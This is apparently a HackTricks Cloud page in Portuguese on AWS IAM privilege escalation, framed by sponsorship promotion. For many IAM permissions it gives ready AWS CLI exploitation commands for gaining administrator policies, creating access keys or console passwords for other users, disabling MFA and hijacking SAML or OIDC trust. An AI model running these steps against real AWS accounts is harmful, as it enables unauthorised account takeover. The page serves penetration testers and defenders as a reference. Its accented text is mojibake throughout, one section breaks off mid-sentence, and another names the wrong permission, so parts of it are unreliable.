# AWS - IAM Privesc

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## IAM

Para mais informa√ß√µes sobre IAM, confira:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

Um invasor com a permiss√£o **`iam:CreatePolicyVersion`** pode criar uma **nova vers√£o de uma pol√≠tica IAM √† qual ele tenha acesso**. Isso permite que ele defina suas **pr√≥prias permiss√µes personalizadas**. Ao criar uma nova vers√£o da pol√≠tica, ela precisa ser **definida como a vers√£o padr√£o para entrar em vigor**, o que faria voc√™ pensar que exigiria a permiss√£o `iam:SetDefaultPolicyVersion`, mas ao criar uma nova vers√£o da pol√≠tica, √© poss√≠vel incluir uma flag (**`--set-as-default`**) que criar√° automaticamente como a **nova vers√£o padr√£o**. Essa flag **n√£o requer** a permiss√£o `iam:SetDefaultPolicyVersion` para ser usada.

Um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
# Enumera√ß√£o
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Explora√ß√£o
aws iam create-policy-version --policy-arn <target_policy_arn> \
    --policy-document file:///path/to/administrator/policy.json --set-as-default
```

Onde o arquivo `policy.json` incluiria um **documento de pol√≠tica que permite qualquer a√ß√£o contra qualquer recurso na conta**.

**Impacto potencial:** Escala√ß√£o direta de privil√©gios para tudo.

### `iam:SetDefaultPolicyVersion`

Um invasor com a permiss√£o **`iam:SetDefaultPolicyVersion`** pode ser capaz de escalar privil√©gios atrav√©s de **vers√µes de pol√≠tica existentes que n√£o est√£o atualmente em uso**. Se uma **pol√≠tica √† qual ele tenha acesso** tiver vers√µes que **n√£o s√£o padr√£o**, ele poder√° alterar a vers√£o padr√£o para qualquer outra vers√£o existente.

{% hint style="warning" %}
Se a **pol√≠tica** que voc√™ est√° **modificando** a vers√£o √© a mesma que est√° **concedendo** ao invasor a permiss√£o `SetDefaultPolicyVersion`, e a **nova vers√£o n√£o concede** essa permiss√£o, o invasor **n√£o poder√° retornar a pol√≠tica ao seu estado original**.
{% endhint %}

Um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
    --version-id v2
```

Onde "v2" √© a vers√£o da pol√≠tica com mais privil√©gios dispon√≠veis.

**Impacto potencial:** Escala√ß√£o indireta de privil√©gios definindo uma vers√£o de pol√≠tica diferente que pode conceder mais permiss√µes.

### `iam:CreateAccessKey`

Um invasor com a permiss√£o **`iam:CreateAccessKey`** em outros usu√°rios pode **criar um ID de chave de acesso e uma chave de acesso secreta pertencentes a outro usu√°rio** no ambiente AWS, se eles ainda n√£o tiverem dois conjuntos associados a eles (o que as melhores pr√°ticas dizem que n√£o deveriam).

Um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
aws iam create-access-key --user-name <target_user>
```

Onde o usu√°rio de destino tem um conjunto estendido de permiss√µes em compara√ß√£o com o usu√°rio atual.

**Impacto potencial:** Escala√ß√£o direta de privil√©gios para qualquer usu√°rio.

### `iam:CreateLoginProfile`

Um invasor com a permiss√£o `iam:CreateLoginProfile` em outros usu√°rios pode **criar uma senha** para usar para **fazer login** no console AWS em **qualquer usu√°rio que ainda n√£o tenha um perfil de login configurado**.

Um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
    --password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t' 
```

Essa senha garante que ela atenda aos **requisitos m√≠nimos de senha da conta**.

**Impacto potencial:** Escala√ß√£o direta de privil√©gios para "qualquer" usu√°rio.

### `iam:UpdateLoginProfile`

Um invasor com a permiss√£o **`iam:UpdateLoginProfile`** em outros usu√°rios pode **alterar a senha usada para fazer login no console AWS** em qualquer usu√°rio que **j√° tenha um perfil de login configurado**.

Assim como criar um perfil de login, um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
    --password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```

Essa senha garante que ela atenda aos **requisitos m√≠nimos de senha da conta**.

**Impacto potencial:** Escala√ß√£o direta de privil√©gios para "qualquer" usu√°rio.

### `iam:UpdateAccessKey`

Um invasor com **`iam:UpdateAccessKey`** pode **ativar uma chave de acesso desativada** e us√°-la (ele precisaria ter a chave de acesso desativada)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**Impacto potencial:** Escala√ß√£o direta de privil√©gios para o usu√°rio da chave de acesso (precisando ter a chave).

### `iam:CreateServiceSpecificCredential`

Permite **gerar** um **nome de usu√°rio** e uma **senha** que podem ser usados para **acessar o servi√ßo especificado** na solicita√ß√£o (**CodeCommit ou Amazon Keyspaces** -- Apache Cassandra
### `iam:PutGroupPolicy`

Um atacante com a permiss√£o `iam:PutGroupPolicy` pode escalar privil√©gios **criando ou atualizando uma pol√≠tica inline para um grupo do qual ele faz parte**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

```bash
aws iam put-group-policy --group-name <group_i_am_in> \
    --policy-name "group_inline_policy" \
    --policy-document file:///path/to/administrator/policy.json
```

Onde o grupo √© **um grupo em que o usu√°rio atual est√°**.

**Impacto potencial:** Privesc direto para qualquer coisa.

### `iam:PutRolePolicy`, `sts:AssumeRole`

Um atacante com a permiss√£o **`iam:PutRolePolicy`** pode escalar privil√©gios **criando ou atualizando uma pol√≠tica inline para uma fun√ß√£o √† qual ele tem acesso**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

Um comando de exemplo para explorar esse m√©todo pode ser assim:

```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
    --policy-name "role_inline_policy" \
    --policy-document file:///path/to/administrator/policy.json
```

Onde a fun√ß√£o √© uma fun√ß√£o que o usu√°rio atual pode temporariamente assumir com `sts:AssumeRole`.

**Impacto potencial:** Privesc direto para qualquer coisa.

### `iam:AddUserToGroup`

Um atacante com a permiss√£o **`iam:AddUserToGroup`** pode us√°-la para **adicionar-se a um grupo IAM existente** na conta AWS.

```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```

Onde **target\_group tem mais/diferentes privil√©gios** do que a conta de usu√°rio do atacante.

**Impacto potencial:** Privesc direto para qualquer grupo.

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

Um atacante com as permiss√µes `iam:UpdateAssumeRolePolicy` e `sts:AssumeRole` seria capaz de **alterar o documento de pol√≠tica de assumir fun√ß√£o de qualquer fun√ß√£o existente** para permitir que ele assuma essa fun√ß√£o.

```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
    --policy-document file:///path/to/assume/role/policy.json
```

Onde a pol√≠tica se parece com a seguinte, que d√° permiss√£o ao usu√°rio para assumir a fun√ß√£o:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Principal": {
                "AWS": "$USER_ARN"
            }
        }
    ]
}
```

**Impacto potencial:** Privesc direto para qualquer fun√ß√£o.

### `iam:UploadSSHPublicKey`

Um atacante com `iam:DeactivateMFADevice` pode fazer upload de uma **chave p√∫blica SSH e associ√°-la ao usu√°rio IAM especificado** ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)).

A chave p√∫blica SSH carregada por esta opera√ß√£o pode ser usada apenas para **autenticar o usu√°rio IAM associado a um reposit√≥rio CodeCommit**. Para obter mais informa√ß√µes sobre o uso de chaves SSH para autentica√ß√£o em um reposit√≥rio CodeCommit, consulte [Configurar o CodeCommit para conex√µes SSH](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) no _Guia do usu√°rio do CodeCommit_.

```bash
aws iam upload-ssh-public-key --user-name <value> \
    --ssh-public-key-body <value>
```

**Impacto potencial:** Privesc indireto para CodeCommit.

### `iam:DeactivateMFADevice`

Um atacante com `iam:DeactivateMFADevice` pode **desativar o dispositivo MFA especificado** e remover sua associa√ß√£o com o usu√°rio IAM para o qual foi originalmente habilitado ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)).

```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```

**Impacto potencial:** Privesc indireto a um usu√°rio se voc√™ j√° conhece seu nome de usu√°rio e senha desativando o dispositivo MFA.

### `iam:ResyncMFADevice`

Um atacante com `iam:ResyncMFADevice` pode **sincronizar o dispositivo MFA especificado** com uma entidade IAM: usu√°rio ou fun√ß√£o ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)).

```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
    --authentication-code1 <value> --authentication-code2 <value>
```

**Impacto potencial:** Privesc indireto a um usu√°rio se voc√™ j√° conhece seu nome de usu√°rio e senha adicionando um dispositivo MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Com essas permiss√µes, voc√™ pode **alterar o XML de metadados da conex√£o SAML**. Em seguida, voc√™ pode abusar da **federa√ß√£o SAML** para **fazer login** com qualquer **fun√ß√£o que confie** nela.

Observe que fazendo isso, **usu√°rios leg√≠timos n√£o poder√£o fazer login**. No entanto, voc√™ pode obter o XML, para que possa colocar o seu, fazer login e configurar o anterior de volta.

```bash
# Listar SAMLs
aws iam list-saml-providers

# Opcional: Obter XML do provedor SAML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Atualizar provedor SAML
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login se passando por fun√ß√µes que confiam no provedor SAML

# Opcional: Defina o XML anterior de volta
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```

{% hint style="info" %}
A FAZER: Uma ferramenta capaz de gerar o metadado SAML e fazer login com uma fun√ß√£o especificada.
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(N√£o tenho certeza sobre isso) Se um atacante tiver essas **permiss√µes**, ele poder√° adicionar uma nova **impress√£o digital** para gerenciar o login em todas as fun√ß√µes que confiam no provedor.

{% code overflow="wrap" %}
```bash
# Listar provedores
aws iam list-open-id-connect-providers
# Opcional: Obter impress√µes digitais usadas para n√£o exclu√≠-las
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Atualizar impress√µes digitais (A impress√£o digital √© sempre uma string de 40 caracteres)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>